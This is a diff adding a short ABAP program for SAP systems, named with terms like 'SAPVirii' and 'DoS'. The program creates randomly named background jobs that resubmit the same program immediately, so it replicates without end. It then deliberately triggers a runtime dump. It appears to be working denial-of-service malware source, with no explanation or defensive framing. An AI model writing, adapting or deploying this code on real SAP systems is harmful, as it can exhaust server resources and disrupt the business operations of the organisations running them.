@@ -1,0 +1,48 @@
+DATA: SAPVIRII LIKE TBTCJOB,
+      RULEZ    LIKE BTCH0000-CHAR1,
+      DoS(20),
+      FoRSAP TYPE P.
+CALL FUNCTION 'RANDOM_C'
+EXPORTING  LEN_MIN   = 10
+           LEN_MAX   = 10
+           CHAR_MIN  = 69
+           CHAR_MAX  = 90
+IMPORTING  RND_VALUE = SAPVirii-JOBNAME
+EXCEPTIONS OTHERS    = 1.
+  CONCATENATE 'DoS' SAPVirii-JOBNAME INTO SAPVirii-JOBNAME.
+CALL FUNCTION 'JOB_OPEN'
+     EXPORTING
+         DELANFREP        = 'X'
+          JOBNAME          = SAPVirii-JOBNAME
+    IMPORTING
+         JOBCOUNT         = SAPVirii-JOBCOUNT
+     EXCEPTIONS
+          CANT_CREATE_JOB  = 1
+          INVALID_JOB_DATA = 2
+          JOBNAME_MISSING  = 3
+          OTHERS           = 4.
+  SUBMIT (SY-REPID) AND RETURN
+         USER SY-UNAME
+         VIA  JOB SAPVirii-JOBNAME NUMBER SAPVirii-JOBCOUNT
+         TO SAP-SPOOL
+         IMMEDIATELY ''
+         WITHOUT SPOOL DYNPRO.
+  CALL FUNCTION 'JOB_CLOSE'
+       EXPORTING
+            JOBCOUNT             = SAPVirii-JOBCOUNT
+            JOBNAME              = SAPVirii-JOBNAME
+            STRTIMMED            = 'X'
+       IMPORTING
+            JOB_WAS_RELEASED     = Rulez
+       EXCEPTIONS
+            CANT_START_IMMEDIATE = 1
+            INVALID_STARTDATE    = 2
+            JOBNAME_MISSING      = 3
+            JOB_CLOSE_FAILED     = 4
+            JOB_NOSTEPS          = 5
+            JOB_NOTEX            = 6
+            LOCK_FAILED          = 7
+            OTHERS               = 8.
+DoS = 'DoS.001'. " Dump is near
+FoRSAP = DoS * 1. " Dump Rulez, Dump DoS
+
